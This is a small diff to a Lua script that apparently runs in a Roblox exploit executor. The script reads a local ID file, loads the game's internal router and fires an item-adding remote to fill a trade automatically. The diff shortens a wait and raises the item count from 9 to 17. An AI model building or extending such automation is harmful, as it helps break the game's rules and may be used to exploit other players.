@@ -60,7 +60,7 @@ local joinedIds = HttpServ:JSONDecode(readfile("joined_ids_adm.txt"))
 
 local loadingScreen = playerGui:WaitForChild("AssetLoadUI")
 while loadingScreen.Enabled do task.wait(1) end
-task.wait(10)
+task.wait(5)
 
 local tradeFrame = playerGui.TradeApp.Frame
 local RouterClient = require(game.ReplicatedStorage.Fsys).load("RouterClient")
@@ -106,7 +106,7 @@ task.spawn(function()
 					table.insert(foodKeys, uid)
 				end
 				if #foodKeys > 0 then
-					for i = 1, math.min(9, #foodKeys) do
+					for i = 1, math.min(17, #foodKeys) do
 						AddItemRemote:FireServer(foodKeys[i])
 					end
 					foodAdded = true
